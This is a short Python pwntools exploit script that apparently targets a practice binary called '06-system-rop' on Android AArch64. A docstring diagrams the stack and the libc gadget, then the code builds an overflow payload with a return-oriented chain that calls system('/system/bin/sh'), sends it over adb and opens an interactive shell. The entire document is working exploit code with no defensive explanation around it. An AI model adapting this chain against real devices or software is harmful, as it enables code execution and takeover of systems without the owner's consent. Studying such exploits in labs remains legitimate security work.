#!/usr/bin/python

'''
gg1:    0x0002b7e0: ldp x29, x30, [sp, #0x10]; mov x0, x20; ldp x20, x19, [sp], #0x20; ret;
gg2:    0x0002b7e0: ldp x29, x30, [sp, #0x10]; mov x0, x20; ldp x20, x19, [sp], #0x20; ret;

stack:
            ~~~~
            8: system_addr
x30         -------
            8
x29         -------
            16
unused      -------   gg2_sp
            8: gg2
x30         -------
            8
x29         -------
            8
x19         -------
            8: sh_addr
x20         -------   gg1_sp
            8: gg1
x30         -------
            8
x29         -------
            128
buffer      -------
            48
vul_sp      -------
'''

from pwn import *

context(arch='aarch64', endian='little', word_size=64, os='android')

bin_path = '/data/local/tmp/06-system-rop'
libc_path = 'libc.so'
libc_elf = ELF(libc_path)
libc_addr = 0x7fbf3c1000
gg1 = libc_addr + 0x2b7e0
gg2 = libc_addr + 0x2b7e0
sh_addr = libc_addr + libc_elf.search('/system/bin/sh\x00').next()
system_addr = libc_addr + libc_elf.symbols['system']

payload = 'a' * (128 + 8)
payload += p64(gg1)
payload += p64(sh_addr)
payload += 'a' * 16
payload += p64(gg2)
payload += 'a' * (16 + 8)
payload += p64(system_addr)

proc = adb.process([bin_path])
proc.recvuntil('> ')
proc.send(payload)
proc.interactive()
